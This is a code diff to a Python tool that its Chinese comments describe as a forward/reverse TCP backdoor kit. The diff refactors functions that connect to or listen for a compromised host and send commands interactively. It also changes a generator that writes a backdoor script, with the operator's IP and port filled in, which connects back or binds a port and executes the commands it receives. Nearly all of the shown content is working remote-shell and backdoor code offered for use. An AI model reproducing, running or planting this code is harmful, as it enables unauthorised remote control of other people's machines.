@@ -63,55 +63,50 @@ def Win():
 """
 
 #连接正向TCP后门
-def connect(ip_port):
-    if type(ip_port) == tuple:
-        t = socket.socket()
-        t.connect(ip_port)
-        try:
-            while True:
-                cmd = input("$>")
-                if cmd == "":print("")
-                else:
-                    t.send(cmd.encode())
-                    print(t.recv(2048).decode())
-        except:
-            print("\n会话已断开")
-        t.close()
-    else:
-        print("参数需要元组类型!")
+def connect(ip,port):
+    t = socket.socket()
+    t.connect((ip,int(port)))
+    try:
+        while True:
+            cmd = input("$>")
+            if cmd == "":print("")
+            else:
+                t.send(cmd.encode())
+                print(t.recv(2048).decode())
+    except:
+        print("\n会话已断开")
+    t.close()
+
 
 #接受反向TCP后门的连接
-def listen(ip_port):
-    if type(ip_port) == tuple:
-        t = socket.socket()
-        t.bind(ip_port)
-        t.listen(1)
-        print("正在监听%s端口" % ip_port[1])
-        c,ip = t.accept()
-        try:
-            while True:
-                cmd = input('$>')
-                if cmd == '':print('')
-                else:
-                    c.send(cmd.encode())
-                    print(c.recv(2048).decode())
-        except:
-            print("\n会话已断开")
-        c.close()
-        t.close()
-    else:
-        print("参数需要元组类型!")
+def listen(ip,port):
+    t = socket.socket()
+    t.bind((ip,int(port)))
+    t.listen(1)
+    print("正在监听%s端口" % port)
+    c,ip = t.accept()
+    try:
+        while True:
+            cmd = input('$>')
+            if cmd == '':print('')
+            else:
+                c.send(cmd.encode())
+                print(c.recv(2048).decode())
+    except:
+        print("\n会话已断开")
+    c.close()
+    t.close()
+
 
 #生成正反向TCP后门
-def generate(i,src,ip_port):
-    if type(ip_port) == tuple:
-        if i == 0:
-            f = open(src,"w+")
-            f.write(code+"""
+def generate(i,src,ip,port):
+    if i == "0":
+        f = open(src,"w+")
+        f.write(code+"""
 if "__main__" == __name__:
     t = socket.socket()
     try:
-        t.connect(%s)
+        t.connect(("%s",%s))
         while True:
             cmd = t.recv(2048).decode().split(" ",1)
             if cmd[0]!="win" and len(cmd)==1:
@@ -127,14 +122,14 @@ if "__main__" == __name__:
         t.close()
     except:
         exit()
-""" % str(ip_port))
-            f.close()
-        elif i == 1:
-            f = open(src,"w")
-            f.write(code+"""
+""" % (ip,port))
+        f.close()
+    elif i == "1":
+        f = open(src,"w")
+        f.write(code+"""
 if "__main__" == __name__:
     t = socket.socket()
-    t.bind(%s)
+    t.bind(("%s",%s))
     t.listen(1)
     c,ip = t.accept()
     while True:
@@ -151,10 +146,8 @@ if "__main__" == __name__:
             c.send(Py(cmd[1]).encode())
     c.close()
     t.close()
-""" % str(ip_port))
-            f.close()
-        else:
-            print("请提供符合要求的参数")
+""" % (ip,port))
+        f.close()
     else:
-        print("参数需要元组类型!")
+        print("请提供符合要求的参数")
 
